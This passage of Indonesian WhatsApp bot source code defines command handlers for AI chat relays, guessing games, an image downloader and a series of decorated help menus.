    if (!text && (!m.quoted || !m.quoted.text)) return sycreply(`Kirim/reply pesan *${prefix + command}* Teksnya`);

    try {
        // Mengambil teks dari pesan atau pesan yang dikutip
        const query = text || m.quoted.text;

        // Mengambil respons dari API
        const hasil = await fetchJson(`https://api.siputzx.my.id/api/ai/bard?query=${encodeURIComponent(query)}`);

        // Mengecek apakah API memberikan respons yang benar
        if (hasil.status === true && hasil.data) {
            sycreply(hasil.data); // Mengirim balasan sesuai respons dari API
        } else {
            sycreply('Terjadi kesalahan saat mengambil data dari API!');
        }
    } catch (error) {
        sycreply('Terjadi kesalahan saat mengambil data dari API!');
        console.error('Error saat mengambil data dari API:', error);
    }
}
break;
case 'llama': {
     
    // Cek apakah ada teks yang dikirim atau teks dari pesan yang dikutip
    if (!text && (!m.quoted || !m.quoted.text)) return sycreply(`Kirim/reply pesan *${prefix + command}* Teksnya`);

    try {
        // Mengambil teks dari pesan atau pesan yang dikutip
        const query = text || m.quoted.text;

        // Mengambil respons dari API dengan prompt yang tersimpan
        const hasil = await fetchJson(`https://api.siputzx.my.id/api/ai/llama?prompt=${encodeURIComponent(llamaPrompt)}&message=${encodeURIComponent(query)}`);

        // Mengecek apakah API memberikan respons yang benar
        if (hasil.status === true && hasil.data) {
            sycreply(hasil.data); // Mengirim balasan sesuai respons dari API
        } else {
            sycreply('Terjadi kesalahan saat mengambil data dari API!');
        }
    } catch (error) {
        sycreply('Terjadi kesalahan saat mengambil data dari API!');
        console.error('Error saat mengambil data dari API:', error);
    }
}
break;

// Fungsi untuk mengatur autoai2
case 'autoai2': {
     
    // Mengecek apakah ada parameter on/off
    if (!isCreator) return sycreply(mess.owner); // Memeriksa apakah pengirim adalah pembuat bot
    if (!text) return sycreply(`Gunakan perintah *${prefix + command}* on/off`);

    // Mengubah status berdasarkan input
    if (text.toLowerCase() === 'on') {
        if (autoAIStatus) {
            return sycreply('Auto AI sudah aktif sebelumnya!');
        }
        autoAIStatus = true;
        sycreply('Auto AI berhasil diaktifkan!');
    } else if (text.toLowerCase() === 'off') {
        if (!autoAIStatus) {
            return sycreply('Auto AI sudah nonaktif sebelumnya!');
        }
        autoAIStatus = false;
        sycreply('Auto AI berhasil dinonaktifkan!');
    } else {
        sycreply(`Gunakan perintah *${prefix + command}* on/off`);
    }
}
break;
case 'setpromt': {
     
        if (!text) return sycreply("Harap masukkan prompt baru!");
        userPrompt = text; // Simpan prompt baru dari input pengguna
        sycreply(`Prompt berhasil diatur menjadi: "${userPrompt}"`);
        break;
    }
    
case 'setpromt2': {
     
    // Cek apakah pengguna mengirim prompt baru
    if (!text) return sycreply(`Kirim perintah *${prefix + command}* <prompt baru>`);

    // Menyimpan prompt baru
    llamaPrompt = text;
    sycreply(`Prompt berhasil diperbarui!\nPrompt baru: ${llamaPrompt}`);
}
break;
			case 'tebaknegara': {
			     
				if (iGame(tebaknegara, m.chat)) return sycreply('Masih Ada Sesi Yang Belum Diselesaikan!')
				const hasil = pickRandom(await fetchJson('https://raw.githubusercontent.com/nazedev/database/refs/heads/master/games/tebaknegara.json'));
				let {
					key
				} = await sycreply(`🎮 Tebak Negara Dari Tempat Berikut :\n\n*Tempat : ${hasil.tempat}*\n\nWaktu : 60s\nHadiah *+3499*`)
				sych.sendMessage(m.chat, {
					react: {
						text: '🌍', // Emoji yang diinginkan
						key: m.key // Memberikan reaksi pada pesan yang baru saja dikirim
					}
				});
				tebaknegara[m.chat + key.id] = {
					jawaban: hasil.negara.toLowerCase(),
					id: key.id
				}
				await sleep(60000)
				if (rdGame(tebaknegara, m.chat, key.id)) {
					sycreply('Waktu Habis\nJawaban: ' + tebaknegara[m.chat + key.id].jawaban)
					delete tebaknegara[m.chat + key.id]
				}
			}
			break
			case 'link2img': {
			     
    if (!text) return sycreply('Masukkan link gambar yang valid!');
    if (!/^https?:\/\//.test(text)) return sycreply('Masukkan link gambar yang valid!');
    
    try {
        const filename = 'image-result.jpg';
        const { data } = await axios({
            url: text,
            method: 'GET',
            responseType: 'arraybuffer'
        });
        
        fs.writeFileSync(filename, data); // Simpan gambar
        await sych.sendMessage(m.chat, {
            image: fs.readFileSync(filename),
            caption: 'Berikut adalah gambar dari link yang Anda berikan.'
        }, { quoted: m });
        fs.unlinkSync(filename); // Hapus file setelah pengiriman
    } catch (err) {
        sycreply('Gagal mengunduh gambar. Pastikan link valid.');
        console.error(err);
    }
}
break;
			case 'tebakepep': {
			     
				if (iGame(tebakepep, m.chat)) return sycreply('Masih Ada Sesi Yang Belum Diselesaikan!');
				try {
					// Mengambil data dari API
					const hasil = await fetchJson('https://api.siputzx.my.id/api/games/karakter-freefire');
					// Log untuk memeriksa response dari API
					console.log('Response dari API:', hasil);
					// Mengecek apakah statusnya true dan data lengkap
					if (!hasil || hasil.status !== true || !hasil.data || !hasil.data.gambar || !hasil.data.name) {
						return sycreply('Terjadi kesalahan saat mengambil data dari API! Response tidak valid atau tidak lengkap.');
					}
					// Menyusun deskripsi permainan
					const deskripsi = `🎮 Tebak Karakter Berikut :\n\nNama Karakter: AYO TEBAK📍\n\nWaktu: 60s\nHadiah *+3499*`;
					// Mengirim gambar dan deskripsi permainan
					let {
						key
					} = await sych.sendFileUrl(m.chat, hasil.data.gambar, deskripsi, m);
					sych.sendMessage(m.chat, {
						react: {
							text: '📛', // Emoji yang diinginkan
							key: m.key // Memberikan reaksi pada pesan yang baru saja dikirim
						}
					});
					// Menyimpan jawaban dan ID sesi
					tebakepep[m.chat + key.id] = {
						jawaban: hasil.data.name.toLowerCase(),
						id: key.id
					};
					// Menunggu selama 60 detik
					await sleep(60000);
					// Mengecek apakah game sudah selesai
					if (rdGame(tebakepep, m.chat, key.id)) {
						sycreply('Waktu Habis\nJawaban: ' + tebakepep[m.chat + key.id].jawaban);
						delete tebakepep[m.chat + key.id];
					}
				} catch (error) {
					sycreply('Terjadi kesalahan saat mengambil data dari API!');
					console.error('Error saat mengambil data dari API:', error);
				}
			}
			break;
			case 'tebakgambar': {
			     
				if (iGame(tebakgambar, m.chat)) return sycreply('Masih Ada Sesi Yang Belum Diselesaikan!')
				const hasil = pickRandom(await fetchJson('https://raw.githubusercontent.com/nazedev/database/refs/heads/master/games/tebakgambar.json'));
				let {
					key
				} = await sych.sendFileUrl(m.chat, hasil.img, `🎮 Tebak Gambar Berikut :\n\n${hasil.deskripsi}\n\nWaktu : 60s\nHadiah *+3499*`, m)
				sych.sendMessage(m.chat, {
					react: {
						text: '🖼️', // Emoji yang diinginkan
						key: m.key // Memberikan reaksi pada pesan yang baru saja dikirim
					}
				});
				tebakgambar[m.chat + key.id] = {
					jawaban: hasil.jawaban.toLowerCase(),
					id: key.id
				}
				await sleep(60000)
				if (rdGame(tebakgambar, m.chat, key.id)) {
					sycreply('Waktu Habis\nJawaban: ' + tebakgambar[m.chat + key.id].jawaban)
					delete tebakgambar[m.chat + key.id]
				}
			}
			break
			case 'tebakbendera': {
			     
				if (iGame(tebakbendera, m.chat)) return sycreply('Masih Ada Sesi Yang Belum Diselesaikan!')
				const hasil = pickRandom(await fetchJson('https://raw.githubusercontent.com/nazedev/database/refs/heads/master/games/tebakbendera.json'));
				let {
					key
				} = await sycreply(`🎮 Tebak Bendera Berikut :\n\n*Bendera : ${hasil.bendera}*\n\nWaktu : 60s\nHadiah *+3499*`)
				sych.sendMessage(m.chat, {
					react: {
						text: '🌎', // Emoji yang diinginkan
						key: m.key // Memberikan reaksi pada pesan yang baru saja dikirim
					}
				});
				tebakbendera[m.chat + key.id] = {
					jawaban: hasil.negara.toLowerCase(),
					id: key.id
				}
				await sleep(60000)
				if (rdGame(tebakbendera, m.chat, key.id)) {
					sycreply('Waktu Habis\nJawaban: ' + tebakbendera[m.chat + key.id].jawaban)
					delete tebakbendera[m.chat + key.id]
				}
			}
			break
			case 'kuismath':
			case 'math': {
			     
				const {
					genMath,
					modes
				} = require('./lib/math');
				const inputMode = ['noob', 'easy', 'medium', 'hard', 'extreme', 'impossible', 'impossible2'];
				if (iGame(kuismath, m.chat)) return sycreply('Masih Ada Sesi Yang Belum Diselesaikan!')
				if (!text) return sycreply(`Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ${prefix}math medium`)
				if (!inputMode.includes(text.toLowerCase())) return sycreply('Mode tidak ditemukan!')
				let result = await genMath(text.toLowerCase())
				let {
					key
				} = await sycreply(`*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu : ${(result.waktu / 1000).toFixed(2)} detik`)
				sych.sendMessage(m.chat, {
					react: {
						text: '🔢', // Emoji yang diinginkan
						key: m.key // Memberikan reaksi pada pesan yang baru saja dikirim
					}
				});
				kuismath[m.chat + key.id] = {
					jawaban: result.jawaban,
					mode: text.toLowerCase(),
					id: key.id
				}
				await sleep(kuismath, result.waktu)
				if (rdGame(m.chat + key.id)) {
					sycreply('Waktu Habis\nJawaban: ' + kuismath[m.chat + key.id].jawaban)
					delete kuismath[m.chat + key.id]
				}
			}
			break
			case 'pler': {
			     
    // Emoji yang akan digunakan
const reactEmojis = ["⏳", "🕛", "🕒", "🕕", "🕘", "🕛", "✅"];

// Mengirimkan reaksi secara berurutan
for (const emoji of reactEmojis) {
    await sych.sendMessage(m.chat, {
        react: {
            text: emoji,
            key: m.key
        }
    });
}
let profile;
				try {
					profile = await sych.profilePictureUrl(m.sender, 'image');
				} catch (e) {
					profile = fake.anonim;
				}
    const inimenu = `
${ucapanWaktu} @${m.sender.split('@')[0]}
    
${f}*Name* : ${m.pushName ? m.pushName : 'Lu Siapa?'}
${f}*Owner* : @${owner[0].split('@')[0]}
${f}*Mode* : ${sych.public ? 'Public' : 'Self'}
${f}*Tanggal* : ${tanggal}
${f}*Hari* : ${hari}
${f}*Jam* : ${jam} WIB

${f}╭━━━┳╮╱╱╭┳━━━┳╮╱╭┳╮╱╱╭╮
${f}┃╭━╮┃╰╮╭╯┃╭━╮┃┃╱┃┃╰╮╭╯┃
${f}┃╰━━╋╮╰╯╭┫┃╱╰┫╰━╯┣╮╰╯╭╯
${f}╰━━╮┃╰╮╭╯┃┃╱╭┫╭━╮┃╰╮╭╯
${f}┃╰━╯┃╱┃┃╱┃╰━╯┃┃╱┃┃╱┃┃
${f}╰━━━╯╱╰╯╱╰━━━┻╯╱╰╯╱╰╯

${n}ᯓ★ SIMPEL MENU ${botname} ★ᯓ${n}

${setv} ${prefix}ALLMENU
${setv} ${prefix}DOWNLOADMENU
${setv} ${prefix}OWNERMENU
${setv} ${prefix}GROUPMENU
${setv} ${prefix}FUNMENU
${setv} ${prefix}GAMEMENU
${setv} ${prefix}AIMENU
${setv} ${prefix}TOOLSMENU
`
if (typemenu === 's1') {
                    sych.sendMessage(m.chat, {
    image: fs.readFileSync('./sychMedia/menu/sychy.jpg'),
    caption: inimenu,
    contextInfo: {
        mentionedJid: [m.sender, '0@s.whatsapp.net', owner[0] + '@s.whatsapp.net']
    }
}, {
    quoted: m
});
                } else if (typemenu === 's2') {
                    sych.sendMessage(m.chat, {
                        text: inimenu,
                        contextInfo: {
                        mentionedJid: [m.sender, '0@s.whatsapp.net', owner[0] + '@s.whatsapp.net'],
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: owname,
                                thumbnail: fs.readFileSync('./sychMedia/menu/sychy.jpg'),
                                sourceUrl: my.gc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') { //SARAN: JANGAN DIGUNAIN SOALNYA DELAY BANGET
                    sych.sendMessage(m.chat, {
    video: fs.readFileSync('./sychMedia/menu/sych.mp4'),
    caption: inimenu,
    contextInfo: {
        mentionedJid: [m.sender, '0@s.whatsapp.net', owner[0] + '@s.whatsapp.net']
    }
}, {
    quoted: qchanel
});
                } else if (typemenu === 's4') {
    await sych.sendMessage(m.chat, {
        video: fs.readFileSync('sychMedia/menu/gif.mp4'),
        caption: inimenu,
        gifPlayback: true,
        contextInfo: {
            mentionedJid: [m.sender, '0@s.whatsapp.net', owner[0] + '@s.whatsapp.net'],
            externalAdReply: {
                showAdAttribution: true,
                containsAutoReply: true,
                title: `${global.botname}`,
                body: `${ucapanWaktu} ${m.pushName ? m.pushName : 'Tanpa Nama'} 👋🏻`,
                previewType: "VIDEO",
                thumbnailUrl: getRandomThumb(),
                sourceUrl: my.gh
            }
        }
    }, { quoted: m });

    await sych.sendMessage(m.chat, {
        audio: fs.readFileSync('sychMedia/menu/audio.mp3'),
        mimetype: 'audio/mp4',
        ptt: false
    }, { quoted: qchanel });
                } else if (typemenu === 's5') {
                    await sych.sendMessage(m.chat, {
					document: fake.docs,
					fileName: ucapanWaktu,
					mimetype: pickRandom(fake.listfakedocs),
					fileLength: '100000000000000',
					pageCount: '999',
					caption: inimenu,
					contextInfo: {
						mentionedJid: [m.sender, '0@s.whatsapp.net', owner[0] + '@s.whatsapp.net'],
						forwardingScore: 10,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterJid: my.ch,
							serverMessageId: null,
							newsletterName: `${botname}${randomEmoji}`
						},
						externalAdReply: {
							title: author,
							body: packname,
							showAdAttribution: true,
							thumbnailUrl: profile,
							mediaType: 1,
							previewType: 0,
							renderLargerThumbnail: true,
							mediaUrl: my.gh,
							sourceUrl: my.gh,
						}
					}
				}, {
					quoted: m
				});
                } else if (typemenu === 's6') {
                    sych.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: inimenu,
                                contextInfo: {
                                mentionedJid: [m.sender, '0@s.whatsapp.net', owner[0] + '@s.whatsapp.net'],
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {quoted: fkontak})
                } else if (typemenu === 's7') {
                    sych.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: inimenu,
                        mimetype: 'application/zip',
                        fileName: owname,
                        fileLength: "99999999999",
                        contextInfo: {
                        mentionedJid: [m.sender, '0@s.whatsapp.net', owner[0] + '@s.whatsapp.net'],
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: owname,
                                thumbnail: fs.readFileSync('./sychMedia/menu/sychy.jpg'),
                                sourceUrl: my.gc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m 
                    })
                } else if (typemenu === 's8') {
                	sych.sendMessage(m.chat, {
      video: fs.readFileSync('./sychMedia/menu/sych.mp4'),
      gifPlayback: true,
      caption: inimenu,
      contextInfo: {
      mentionedJid: [m.sender, '0@s.whatsapp.net', owner[0] + '@s.whatsapp.net'],
      externalAdReply: {
      title: botname,
      body: owname,
      thumbnailUrl: "https://i.ibb.co.com/zRtB6RG/37e35bef9ed65ac1b6bfee6dd26c880b.jpg",
      sourceUrl: my.gh,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }}, {
                        quoted: m
                    })
      } else if (typemenu === 's9') {
                	sych.sendMessage(m.chat, {
video: fs.readFileSync('./sychMedia/menu/sych.mp4'),
caption: inimenu,
gifPlayback: true,
contextInfo: {
mentionedJid: [m.sender, '0@s.whatsapp.net', owner[0] + '@s.whatsapp.net'],
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: owname,
newsletterJid: "120363383347233294@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: owname,
body: botname,
thumbnailUrl: "https://i.ibb.co.com/zRtB6RG/37e35bef9ed65ac1b6bfee6dd26c880b.jpg",
sourceUrl: my.gh,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
}
}
break
    case 'gamemenu':
    case 'gemmenu': {
         
    const gmenu = `
${ucapanWaktu} @${m.sender.split('@')[0]}

${f}┏━━━┳┓╋╋┏┳━━━┳┓╋┏┳━━━┳━━━┓
${f}┃┏━┓┃┗┓┏┛┃┏━┓┃┃╋┃┃┏━━┫┏━━┛
${f}┃┗━━╋┓┗┛┏┫┃╋┗┫┗━┛┃┗━━┫┗━━┓
${f}┗━━┓┃┗┓┏┛┃┃╋┏┫┏━┓┃┏━━┫┏━━┛
${f}┃┗━┛┃╋┃┃╋┃┗━┛┃┃╋┃┃┗━━┫┗━━┓
${f}┗━━━┛╋┗┛╋┗━━━┻┛╋┗┻━━━┻━━━┛

${n}GAME MENU ᯤ${n}

${setv} ${prefix}tictactoe
${setv} ${prefix}akinator
${setv} ${prefix}suit
${setv} ${prefix}slot
${setv} ${prefix}math (level)
${setv} ${prefix}begal
${setv} ${prefix}casino (nominal)
${setv} ${prefix}rampok (@tag)
${setv} ${prefix}tekateki
${setv} ${prefix}tebaklirik
${setv} ${prefix}tebakkata
${setv} ${prefix}tebakbom
${setv} ${prefix}susunkata
${setv} ${prefix}tebakkimia
${setv} ${prefix}caklontong
${setv} ${prefix}tebaknegara
${setv} ${prefix}tebakgambar
${setv} ${prefix}tebakepep
${setv} ${prefix}tebakbendera
`    
await sych.sendMessage(m.chat, {
        text: gmenu,
        contextInfo: {
        mentionedJid: [m.sender, '0@s.whatsapp.net', owner[0] + '@s.whatsapp.net'],
            externalAdReply: {
                "showAdAttribution": true,
                "containsAutoReply": true,
                "title": `${global.botname}`,
                "body": `< / > Game Menu`,
                "previewType": "VIDEO",
                "thumbnailUrl": getRandomThumb(), // Mengambil thumbnail secara random
                "sourceUrl": my.gh
            }
        }
    }, {
        quoted: repPy
    })
}
break
case 'funmenu': 
case 'fmenu': {
     
const fmenu = `
${ucapanWaktu} @${m.sender.split('@')[0]}

${f}┏━━━┳┓╋╋┏┳━━━┳┓╋┏┳━━━┳━━━┓
${f}┃┏━┓┃┗┓┏┛┃┏━┓┃┃╋┃┃┏━━┫┏━━┛
${f}┃┗━━╋┓┗┛┏┫┃╋┗┫┗━┛┃┗━━┫┗━━┓
${f}┗━━┓┃┗┓┏┛┃┃╋┏┫┏━┓┃┏━━┫┏━━┛
${f}┃┗━┛┃╋┃┃╋┃┗━┛┃┃╋┃┃┗━━┫┗━━┓
${f}┗━━━┛╋┗┛╋┗━━━┻┛╋┗┻━━━┻━━━┛

${n}FUN MENU ᯤ${n}

${setv} ${prefix}dadu
${setv} ${prefix}reminder
${setv} ${prefix}cermin (q)
${setv} ${prefix}bisakah (text)
${setv} ${prefix}apakah (text)
${setv} ${prefix}kapan (text)
${setv} ${prefix}kerangajaib (text)
${setv} ${prefix}cekmati (nama lu)
${setv} ${prefix}ceksifat
${setv} ${prefix}cekkhodam (nama lu)
${setv} ${prefix}rate (reply pesan)
${setv} ${prefix}jodohku
${setv} ${prefix}jadian
${setv} ${prefix}fitnah
${setv} ${prefix}halah (text)
${setv} ${prefix}hilih (text)
${setv} ${prefix}huluh (text)
${setv} ${prefix}heleh (text)
${setv} ${prefix}holoh (text)
`
await sych.sendMessage(m.chat, {
        text: fmenu,
        contextInfo: {
        mentionedJid: [m.sender, '0@s.whatsapp.net', owner[0] + '@s.whatsapp.net'],
            externalAdReply: {
                "showAdAttribution": true,
                "containsAutoReply": true,
                "title": `${global.botname}`,
                "body": `< / > Fun Menu`,
                "previewType": "VIDEO",
                "thumbnailUrl": getRandomThumb(), // Mengambil thumbnail secara random
                "sourceUrl": my.gh
            }
        }
    }, {
        quoted: repPy
    })
}
break
    case 'toolsmenu':
    case 'toolmenu': {
         
    const tlmenu = `
${ucapanWaktu} @${m.sender.split('@')[0]}

${f}┏━━━┳┓╋╋┏┳━━━┳┓╋┏┳━━━┳━━━┓
${f}┃┏━┓┃┗┓┏┛┃┏━┓┃┃╋┃┃┏━━┫┏━━┛
${f}┃┗━━╋┓┗┛┏┫┃╋┗┫┗━┛┃┗━━┫┗━━┓
${f}┗━━┓┃┗┓┏┛┃┃╋┏┫┏━┓┃┏━━┫┏━━┛
${f}┃┗━┛┃╋┃┃╋┃┗━┛┃┃╋┃┃┗━━┫┗━━┓
${f}┗━━━┛╋┗┛╋┗━━━┻┛╋┗┻━━━┻━━━┛

${n}TOOLS MENU ᯤ${n}

${setv} ${prefix}get (url)
${setv} ${prefix}link2img (url)
${setv} ${prefix}encode (q)
${setv} ${prefix}setcmd (reply stc)
${setv} ${prefix}listcmd
${setv} ${prefix}delcmd (reply stc)
${setv} ${prefix}cekcuaca (kota)
${setv} ${prefix}decode (q encode)
${setv} ${prefix}hd (reply pesan)
${setv} ${prefix}brat (txt)
${setv} ${prefix}toaudio (reply pesan)
${setv} ${prefix}tomp3 (reply pesan)
${setv} ${prefix}tovn (reply pesan)
${setv} ${prefix}toimage (reply pesan)
${setv} ${prefix}toptv (reply pesan)
${setv} ${prefix}tourl (reply pesan)
${setv} ${prefix}getq (reply pesan)
${setv} ${prefix}tts (textnya)
${setv} ${prefix}toqr (textnya)
${setv} ${prefix}ssweb (url)
${setv} ${prefix}sticker (send/reply img)
${setv} ${prefix}colong (reply stiker)
${setv} ${prefix}smeme (send/reply img)
${setv} ${prefix}emojimix 🙃+💀
${setv} ${prefix}nulis
${setv} ${prefix}joko (teksnya)
${setv} ${prefix}readmore text1|text2
${setv} ${prefix}qc (pesannya)
${setv} ${prefix}translate
${setv} ${prefix}wasted (send/reply img)
${setv} ${prefix}triggered (send/reply img)
${setv} ${prefix}shorturl (urlnya)
${setv} ${prefix}gitclone (urlnya)
${setv} ${prefix}fat (reply audio)
${setv} ${prefix}fast (reply audio)
${setv} ${prefix}bass (reply audio)
${setv} ${prefix}slow (reply audio)
${setv} ${prefix}tupai (reply audio)
${setv} ${prefix}deep (reply audio)
${setv} ${prefix}robot (reply audio)
${setv} ${prefix}blown (reply audio)
${setv} ${prefix}reverse (reply audio)
${setv} ${prefix}smooth (reply audio)
${setv} ${prefix}earrape (reply audio)
${setv} ${prefix}nightcore (reply audio)
${setv} ${prefix}getexif (reply sticker)
${setv} ${prefix}sticktele

${f}©${botname}
`    
await sych.sendMessage(m.chat, {
        text: tlmenu,
        contextInfo: {
        mentionedJid: [m.sender, '0@s.whatsapp.net', owner[0] + '@s.whatsapp.net'],
            externalAdReply: {
                "showAdAttribution": true,
                "containsAutoReply": true,
                "title": `${global.botname}`,
                "body": `< / > Tools Menu`,
                "previewType": "VIDEO",
                "thumbnailUrl": getRandomThumb(), // Mengambil thumbnail secara random
                "sourceUrl": my.gh
            }
        }
    }, {
        quoted: repPy
    })
}
break
case 'downloadmenu':
case 'downmenu': {
     
const downmenu = `
${ucapanWaktu} @${m.sender.split('@')[0]}

${f}┏━━━┳┓╋╋┏┳━━━┳┓╋┏┳━━━┳━━━┓
${f}┃┏━┓┃┗┓┏┛┃┏━┓┃┃╋┃┃┏━━┫┏━━┛
${f}┃┗━━╋┓┗┛┏┫┃╋┗┫┗━┛┃┗━━┫┗━━┓
${f}┗━━┓┃┗┓┏┛┃┃╋┏┫┏━┓┃┏━━┫┏━━┛
${f}┃┗━┛┃╋┃┃╋┃┗━┛┃┃╋┃┃┗━━┫┗━━┓
${f}┗━━━┛╋┗┛╋┗━━━┻┛╋┗┻━━━┻━━━┛

${n}DOWNLOAD MENU ᯤ${n}

${setv} ${prefix}spotifydl (url)
${setv} ${prefix}ytmp3 (url)
${setv} ${prefix}ttslide (url)
${setv} ${prefix}play3 (query)
${setv} ${prefix}song (query)
${setv} ${prefix}instagram (url)
${setv} ${prefix}tiktok (url)
${setv} ${prefix}facebook (url)
${setv} ${prefix}mediafire (url)
${setv} ${prefix}videymp4 (url)

${f}©${botname}
`
await sych.sendMessage(m.chat, {
        text: downmenu,
        contextInfo: {
        mentionedJid: [m.sender, '0@s.whatsapp.net', owner[0] + '@s.whatsapp.net'],
            externalAdReply: {
                "showAdAttribution": true,
                "containsAutoReply": true,
                "title": `${global.botname}`,
                "body": `< / > Download Menu`,
                "previewType": "VIDEO",
                "thumbnailUrl": getRandomThumb(), // Mengambil thumbnail secara random
                "sourceUrl": my.gh
            }
        }
    }, {
        quoted: repPy
    })
}    
    break
    case 'aimenu': {
         
    const aimenu = `
${ucapanWaktu} @${m.sender.split('@')[0]}

${f}┏━━━┳┓╋╋┏┳━━━┳┓╋┏┳━━━┳━━━┓
${f}┃┏━┓┃┗┓┏┛┃┏━┓┃┃╋┃┃┏━━┫┏━━┛
${f}┃┗━━╋┓┗┛┏┫┃╋┗┫┗━┛┃┗━━┫┗━━┓
${f}┗━━┓┃┗┓┏┛┃┃╋┏┫┏━┓┃┏━━┫┏━━┛
${f}┃┗━┛┃╋┃┃╋┃┗━┛┃┃╋┃┃┗━━┫┗━━┓
${f}┗━━━┛╋┗┛╋┗━━━┻┛╋┗┻━━━┻━━━┛

${n}AI MENU ᯤ${n}
    
${setv} ${prefix}ai (query)
${setv} ${prefix}gemini (query)
${setv} ${prefix}luminai (query)
${setv} ${prefix}meta (query)
${setv} ${prefix}llama (query)
${setv} ${prefix}setpromt2 (query)
${setv} ${prefix}setpromt (query)
${setv} ${prefix}simi (query)
${setv} ${prefix}aitukam
${setv} ${prefix}esia
${setv} ${prefix}autoai2 (own)
${setv} ${prefix}autoai (own)
${setv} ${prefix}txt2img (query)
${setv} ${prefix}img2text (reply img/stc)
${setv} ${prefix}aimg (query)
`
await sych.sendMessage(m.chat, {
        text: aimenu,
        contextInfo: {
        mentionedJid: [m.sender, '0@s.whatsapp.net', owner[0] + '@s.whatsapp.net'],
            externalAdReply: {
                "showAdAttribution": true,
                "containsAutoReply": true,
                "title": `${global.botname}`,
                "body": `< / > AI Menu`,
                "previewType": "VIDEO",
                "thumbnailUrl": getRandomThumb(), // Mengambil thumbnail secara random
                "sourceUrl": my.gh
            }
        }
    }, {
        quoted: repPy
    })
}
    break    
    case 'ownermenu':
    case 'ownmenu': {
         
    const ownmenu = `
${ucapanWaktu} @${m.sender.split('@')[0]}

${f}┏━━━┳┓╋╋┏┳━━━┳┓╋┏┳━━━┳━━━┓
${f}┃┏━┓┃┗┓┏┛┃┏━┓┃┃╋┃┃┏━━┫┏━━┛
${f}┃┗━━╋┓┗┛┏┫┃╋┗┫┗━┛┃┗━━┫┗━━┓
${f}┗━━┓┃┗┓┏┛┃┃╋┏┫┏━┓┃┏━━┫┏━━┛
${f}┃┗━┛┃╋┃┃╋┃┗━┛┃┃╋┃┃┗━━┫┗━━┓
${f}┗━━━┛╋┗┛╋┗━━━┻┛╋┗┻━━━┻━━━┛

${n}OWNER MENU ᯤ${n}

${setv} ${prefix}bot [set]
${setv} ${prefix}addthumb <nme|lnk>
${setv} ${prefix}delthumb <nme>
${setv} ${prefix}listthumb
${setv} ${prefix}setexif
${setv} ${prefix}setbio
${setv} ${prefix}setppbot
${setv} ${prefix}setmenu s<1-9>
${setv} ${prefix}join
${setv} ${prefix}typodetect on/off
${setv} ${prefix}leave
${setv} ${prefix}block
${setv} ${prefix}listblock
${setv} ${prefix}openblock
${setv} ${prefix}listpc
${setv} ${prefix}addcase
${setv} ${prefix}getcase
${setv} ${prefix}delcase
${setv} ${prefix}listgc
${setv} ${prefix}liatowner
${setv} ${prefix}addowner
${setv} ${prefix}delowner
${setv} ${prefix}checklocation
${setv} ${prefix}creategc
${setv} ${prefix}addprem
${setv} ${prefix}delprem
${setv} ${prefix}listprem
${setv} ${prefix}addlimit
${setv} ${prefix}adduang
${setv} ${prefix}bot --settings
${setv} ${prefix}bot settings
${setv} ${prefix}getsession
${setv} ${prefix}delsession
${setv} ${prefix}delsampah
${setv} ${prefix}upsw
${setv} ${prefix}shutdown
${setv} ${prefix}restart
${setv} $
${setv} >
${setv} <

${f}©${botname}
`
await sych.sendMessage(m.chat, {
        text: ownmenu,
        contextInfo: {
        mentionedJid: [m.sender, '0@s.whatsapp.net', owner[0] + '@s.whatsapp.net'],
            externalAdReply: {
                "showAdAttribution": true,
                "containsAutoReply": true,
                "title": `${global.botname}`,
                "body": `< / > Owner Menu`,
                "previewType": "VIDEO",
                "thumbnailUrl": getRandomThumb(), // Mengambil thumbnail secara random
                "sourceUrl": my.gh
            }
        }
    }, {
        quoted: repPy
    })
}
    break    
    case 'groupmenu': 
    case 'grupmenu': {
         
    const gcmenu = `
${ucapanWaktu} @${m.sender.split('@')[0]}

${f}┏━━━┳┓╋╋┏┳━━━┳┓╋┏┳━━━┳━━━┓
${f}┃┏━┓┃┗┓┏┛┃┏━┓┃┃╋┃┃┏━━┫┏━━┛
${f}┃┗━━╋┓┗┛┏┫┃╋┗┫┗━┛┃┗━━┫┗━━┓
${f}┗━━┓┃┗┓┏┛┃┃╋┏┫┏━┓┃┏━━┫┏━━┛
${f}┃┗━┛┃╋┃┃╋┃┗━┛┃┃╋┃┃┗━━┫┗━━┓
${f}┗━━━┛╋┗┛╋┗━━━┻┛╋┗┻━━━┻━━━┛

${n}GROUP MENU ᯤ${n}

${setv} ${prefix}add (62xxx)
${setv} ${prefix}kick (@tag/62xxx)
${setv} ${prefix}promote (@tag/62xxx)
${setv} ${prefix}demote (@tag/62xxx)
${setv} ${prefix}setname (nama baru gc)
${setv} ${prefix}setdesc (desk)
${setv} ${prefix}setppgc (reply imgnya)
${setv} ${prefix}delete (reply pesan)
${setv} ${prefix}linkgrup
${setv} ${prefix}analyzechats
${setv} ${prefix}revoke
${setv} ${prefix}startsecret (@tag)
${setv} ${prefix}secretmsg (q)
${setv} ${prefix}endsecret
${setv} ${prefix}tagall
${setv} ${prefix}hidetag
${setv} ${prefix}totag (reply pesan)
${setv} ${prefix}listonline
${setv} ${prefix}grup set

${f}©${botname}
`
await sych.sendMessage(m.chat, {
        text: gcmenu,
        contextInfo: {
        mentionedJid: [m.sender, '0@s.whatsapp.net', owner[0] + '@s.whatsapp.net'],
            externalAdReply: {
                "showAdAttribution": true,
                "containsAutoReply": true,
                "title": `${global.botname}`,
